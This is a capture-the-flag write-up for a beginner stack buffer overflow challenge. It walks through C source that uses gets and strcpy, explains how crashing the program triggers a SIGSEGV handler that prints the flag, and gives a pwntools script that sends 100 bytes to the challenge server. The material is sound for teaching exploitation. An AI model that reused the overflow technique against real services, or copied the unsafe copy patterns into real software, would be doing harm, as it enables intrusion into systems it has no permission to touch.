# Cylabacademy - Buffer Overflow 0 Writeup (Automated Exploit & Stack Alignment Analysis)

This repository contains a fully automated exploit script and an in-depth architectural vulnerability breakdown for the **Buffer Overflow 0** challenge from Clabacademy. This challenge demonstrates how a stack buffer overflow can be leveraged to deliberately crash an application to trigger an internal memory-corruption signal handler.

---

## 1. Challenge Architecture & Source Code
The application is written in C and handles memory management strings unsafely using obsolete libc inputs. Upon initialization, it reads the flag from the filesystem and maps it into a global variable buffer called `flag`.

The objective is to leak the global `flag` variable.

### Source Code Setup
```c
#define FLAGSIZE_MAX 64
char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input); // Target Vulnerability: Boundary-blind copy
}

int main(int argc, char **argv){
  FILE *f = fopen("flag.txt","r");
  // ... reads flag into the global 'flag' variable ...
  
  signal(SIGSEGV, sigsegv_handler); // Instantiating the emergency signal handler
  
  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  return 0;
}
```

---

## 2. In-Depth Vulnerability Analysis

### The Flaw: Boundary-Blind String Copying
Inside the `vuln()` function, the application instantiates a local character array buffer named `buf2` with a maximum capacity of exactly 16 bytes. It then utilizes the unsafe `strcpy()` function to copy user-supplied input into `buf2`. 

Because `strcpy()` does not perform boundaries checking or verify bounds constraints, it continues writing bytes into memory sequentially until it hits a null terminator (`\x00`). If the input data stream exceeds 16 bytes, it spills out of the designated buffer bounds and overwrites adjacent stack frames.

### The Attack Vector: Forcing a Segmentation Fault (SIGSEGV)
Normally, an attacker performs a stack overflow to overwrite the saved frame pointer (RBP) and the function Return Address (RIP) to redirect control flow. However, this challenge implements an unconventional safety mechanism:
```c
signal(SIGSEGV, sigsegv_handler);
```
`SIGSEGV` (Segmentation Fault) is an execution signal dispatched by the operating system's kernel when a process attempts to read or write to an invalid, unallocated, or protected virtual memory address. The developer registered `sigsegv_handler` to catch this error, but programmed it to print the global `flag` variable when a crash occurs.

Therefore, our attack objective shifts: **We do not need to hijack control flow. We simply need to corrupt the stack memory severely enough to force a process panic, triggering the kernel to execute the signal handler.**

### Overcoming Memory Alignment Limitations (The 28 vs 100 Byte Mystery)
During early exploit attempts, writing exactly 28 bytes (`16 bytes for buf2 + 12 bytes padding`) caused the remote server to close the connection without dumping data. 

**Why did this happen?**
Modern x86_64 compilers enforce strict **Stack Realignment/Padding** configurations to speed up CPU reads. Instead of placing variables directly next to each other, the compiler pads the local stack frame with extra dead space. 

Because of this alignment slack, a 28-byte payload filled the compiler padding but failed to reach or corrupt critical memory pointers. To reliably crash the application across varying operating system environments and compiler specifications, we scale the payload size to **100 bytes**. This guarantees that the execution control flags are obliterated, forcing an immediate `SIGSEGV` and capturing the flag.

---

## 3. Exploit Development & Script Analysis

The automated script utilizes the `pwntools` framework to drive the network connection and manage byte synchronization. It breaks down into specific logical primitives:

* **`context.log_level = 'debug'`**: Enhances terminal logging to pipe out every single raw hex byte transmitted across the wire, ensuring total transaction visibility.
* **`p.recvuntil(b"Input: ")`**: Synchronizes the script timeline with the remote network socket, forcing Python to halt execution until the application is ready to accept inputs.
* **`payload = b"A" * 100`**: Dynamically constructs a string of 100 sequential characters to safely oversaturate the target memory buffer.
* **`p.recvall()`**: Listens to the dying network socket stream to collect any residual bytes emitted by the application right before it panics and terminates.

---

## 4. Automated Exploit Script (`exploit.py`)

```python
#!/usr/bin/env python3
from pwn import *


context.log_level = 'debug'


HOST = 'chatelaine.cylabacademy.net'
PORT = 24685  

def main():
    try:
        log.info(f"Connecting to remote target {HOST}:{PORT}...")
        p = remote(HOST, PORT)
        
        # 1. Synchronize network interface prompt
        log.info("Waiting for the 'Input: ' prompt from server...")
        p.recvuntil(b"Input: ")
        
        # 2. Construct an oversized payload to guarantee stack destruction
        # 100 bytes completely floods 'buf2' and overruns compiler alignment padding
        payload = b"A" * 100
        
        # 3. Inject payload to force a SIGSEGV memory crash
        log.info("Sending 100 bytes of payload to break stack boundaries...")
        p.sendline(payload)
        
        # 4. Scrape raw terminal stream to capture the leaked flag
        log.info("Capturing flag from the emergency signal handler output...")
        output = p.recvall(timeout=5).decode('utf-8', errors='ignore')
        
        # Visual Anchor Formatting: Prints clear boundary markers for readability
        print("\n" + "=" * 60)
        print(f"[+] EXPLOIT SUCCESSFUL! SERVER EXPELLED:\n{output.strip()}")
        print("=" * 60 + "\n")
        
    except Exception as e:
        log.exception(f"Exploit pipeline execution hit a fatal crash: {e}")

if __name__ == '__main__':
    main()
```

---

